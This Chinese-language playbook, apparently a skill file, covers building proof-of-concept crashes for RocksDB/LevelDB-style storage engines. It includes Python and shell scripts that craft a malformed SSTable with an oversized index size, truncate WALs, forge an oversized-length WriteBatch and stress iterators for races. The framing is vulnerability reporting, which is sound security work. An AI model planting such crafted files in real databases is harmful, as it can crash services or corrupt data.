---
description: 生成存储引擎漏洞 PoC：最小畸形 DB 文件导致崩溃、迭代器压力脚本与 WAL 损坏 PoC。
tags: [storage-engine, poc, reproduction, fuzzing, crash]
---

# PoC 生成 (PoC Generator)

## 1. 专家直觉触发器 (Triggers)

专家在准备存储引擎漏洞报告时，会立即基于以下需求生成 PoC：

- **需要最小可复现文件**：将复杂的 fuzz case 精简为几个字节或一个最小的 SSTable/WAL 文件。
- **需要证明崩溃确定性**：PoC 应在标准配置下 100% 触发崩溃或 ASAN 报错。
- **需要避免数据污染**：PoC 应使用临时目录，不破坏开发者的真实数据库。
- **需要展示数据损坏**：除了崩溃，还需证明迭代器返回错误数据或 checksum 校验失败。
- **需要可移植**：PoC 应在 x86_64 和 ARM64 上表现一致，不依赖特定硬件。
- **需要自动化**：PoC 应封装为单条命令或脚本，方便厂商一键运行。

这些触发器要求 PoC 在“精确性”、“最小性”、“安全性”之间取得平衡。

## 2. 不可跳过的问题链 (Question Chain)

在生成 PoC 前，必须回答：

1. **PoC 的最小触发条件是什么？**  
   是一个畸形的 SSTable 文件，还是一条特定的写入序列？是否需要先创建正常数据库再注入？
2. **目标版本和编译选项？**  
   PoC 针对的是哪个 commit？是否启用了 `PORTABLE=1`？是否使用了 `-DNDEBUG`？
3. **如何证明漏洞存在而不掩盖根因？**  
   ASAN 的 `heap-buffer-overflow` 是否指向漏洞代码行？还是只是症状？
4. **PoC 的输出如何被客观验证？**  
   返回码非零？日志包含 `Corruption`？GDB backtrace 显示特定函数？
5. **清理步骤是否完整？**  
   PoC 是否自动清理临时文件？是否在崩溃后遗留锁文件需要手动删除？
6. **是否能在无外部依赖环境中运行？**  
   是否需要特殊的 fuzzer 语料？是否能用标准 shell 工具和 Python 生成？

## 3. 攻击链闭合 (Attack Chain Closure)

PoC 必须将攻击链压缩为可重复验证的步骤。以下是“畸形 SSTable 导致迭代器崩溃”的 PoC 逻辑：

**PoC 目标**：证明一个手工修改了 Index Block size 的 SSTable 文件，能在引擎打开时导致 `SIGSEGV`。

**步骤 1（前置）**：使用标准工具生成一个包含少量键值对的正常 SSTable 文件 `normal.sst`。
**步骤 2（篡改）**：用十六进制编辑器或脚本定位 SSTable Footer（文件末尾 48 字节）。将其中 `index_handle.size` 从原始值（如 100）修改为 `0xFFFFFFFFFFFFFFFF`。
**步骤 3（投递）**：将篡改后的文件重命名为 `000001.sst`，放入引擎的数据目录，并编写一个假的 `CURRENT` 和 `MANIFEST` 指向该文件。
**步骤 4（触发）**：运行 `./db_open --db=/tmp/poc_db`。引擎会尝试读取 Footer，发现合法的 Magic Number，然后尝试读取 Index Block。
**步骤 5（验证）**：由于 `index_handle.size` 极大，引擎可能尝试分配超大内存（`bad_alloc`）或分配小缓冲区后越界读取。若使用 ASAN 编译，将报告 `heap-buffer-overflow`。

**逻辑闭环**：如果引擎信任 SSTable 文件内嵌的 size 字段，且未对 size 做上限校验，则上述 PoC 在任何平台上都能复现。因此，**该 PoC 的成功执行等价于存在不受信任输入导致的越界读取**。

## 4. 代码示例 (Code Examples)

### 4.1 最小畸形 SSTable PoC 生成器

```python
#!/usr/bin/env python3
# gen_malformed_sst.py
import struct
import sys

MAGIC = b'\x57\xFB\x80\x8B\x24\x75\x47\xDB'  # RocksDB/LevelDB Magic

def create_evil_sst(path):
    with open(path, 'wb') as f:
        # 写一些垃圾数据作为 "data block"
        f.write(b'\x00' * 100)
        # Footer: meta_index_handle (offset, size) + index_handle (offset, size) + padding + magic
        meta_index = struct.pack('<QQ', 0, 10)   # offset=0, size=10
        index_handle = struct.pack('<QQ', 0, 0xFFFFFFFFFFFFFFFF)  # evil size
        f.write(meta_index)
        f.write(index_handle)
        f.write(b'\x00' * 8)  # padding to 48 bytes footer for some formats
        f.write(MAGIC)
    print(f"[*] Evil SSTable written to {path}")

if __name__ == "__main__":
    create_evil_sst(sys.argv[1] if len(sys.argv) > 1 else "evil.sst")
```

**说明**：生成的文件拥有合法 Magic Number 但非法 BlockHandle。可用于测试 `DB::Open` 和 `SSTFileReader` 的鲁棒性。

### 4.2 迭代器压力测试 PoC

```bash
#!/bin/bash
# poc_iterator_stress.sh
DB_PATH="/tmp/poc_iter_db"
rm -rf $DB_PATH

# 编译时启用 ASAN: make clean && make -j ASAN=1
./db_bench --benchmarks=fillrandom,readrandom --db=$DB_PATH \
           --num=100000 --threads=4 --duration=60 \
           --open_files=100 &
BENCH_PID=$!

# 同时不断创建和遍历快照
for i in {1..100}; do
    ./snapshot_stress --db=$DB_PATH --iterations=1000 &
done

wait
# 检查 ASAN 日志
if grep -q "ERROR: AddressSanitizer" asan.log.* 2>/dev/null; then
    echo "[VULN] Iterator-related memory error detected"
fi
```

**说明**：通过并发写入和快照迭代，放大 compaction 与迭代器的生命周期冲突。

### 4.3 WAL 截断 PoC 脚本

```bash
#!/bin/bash
# poc_wal_truncate.sh
DB_PATH="/tmp/poc_wal_db"
rm -rf $DB_PATH

./db_write_stress --db=$DB_PATH --writes=100000 &
PID=$!
sleep 1
kill -9 $PID

WAL=$(ls -t $DB_PATH/*.log | head -n 1)
ORIG_SIZE=$(stat -c%s "$WAL")
truncate -s -1 "$WAL"
NEW_SIZE=$((ORIG_SIZE - 1))
echo "[*] Truncated $WAL from $ORIG_SIZE to $NEW_SIZE"

./db_recover --db=$DB_PATH
EXIT_CODE=$?
echo "[*] Recover exit code: $EXIT_CODE"
# 期望为 0（优雅处理）而非 139 (SIGSEGV)
```

### 4.4 超大键值 PoC

```python
#!/usr/bin/env python3
# poc_oversized_kv.py
import sys

def make_varint(value):
    result = bytearray()
    while value > 0x7F:
        result.append((value & 0x7F) | 0x80)
        value >>= 7
    result.append(value & 0x7F)
    return bytes(result)

# 构造一个 WriteBatch，键长度声称极大但实际数据很小
batch = bytearray()
batch.extend(make_varint(0xFFFFFFFF))  # key length = 4GB claimed
batch.extend(b"X" * 10)                # actual key data = 10 bytes

with open("evil.batch", "wb") as f:
    f.write(batch)
print("[*] Write batch with oversized key length written to evil.batch")
```

**说明**：用于测试 WriteBatch 解析器在声明长度与实际数据不匹配时的行为。

### 4.5 最小 Race Condition PoC（C++）

```cpp
// poc_race.cc
#include <thread>
#include <vector>
#include <rocksdb/db.h>

using namespace rocksdb;

int main() {
  DB* db;
  Options opts;
  opts.create_if_missing = true;
  DB::Open(opts, "/tmp/race_db", &db);

  std::vector<std::thread> threads;
  for (int i = 0; i < 16; ++i) {
    threads.emplace_back([db, i]() {
      for (int j = 0; j < 10000; ++j) {
        db->Put(WriteOptions(), std::to_string(i) + "_" + std::to_string(j), "v");
        auto* it = db->NewIterator(ReadOptions());
        it->SeekToFirst();
        delete it;
      }
    });
  }
  for (auto& t : threads) t.join();
  delete db;
  return 0;
}
```

**说明**：高并发下同时写入和创建迭代器，极易触发 compaction 与迭代器生命周期竞争。应使用 TSan 编译运行。
